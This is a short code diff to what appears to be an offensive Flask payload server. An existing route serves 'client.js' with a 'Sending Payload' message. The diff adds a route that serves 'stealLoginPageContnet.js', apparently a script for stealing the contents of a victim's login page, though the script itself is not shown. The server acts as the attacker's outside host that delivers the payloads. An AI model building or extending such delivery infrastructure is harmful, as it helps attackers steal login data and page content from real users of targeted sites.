@@ -41,7 +41,10 @@ def clientjs():
     print("[+] Sending Payload")
     return send_file('./client.js', download_name='client.js')
 
-
+@app.route('/stealLoginPageContnet.js', methods=['GET'])
+def stealLoginPageContnet():
+    print("[+] Sending Payload")
+    return send_file('./stealLoginPageContnet.js', download_name='stealLoginPageContnet.js')
 
 parser = argparse.ArgumentParser()
 parser.add_argument('--host', help='IP to Listen On', type=str, default="0.0.0.0")
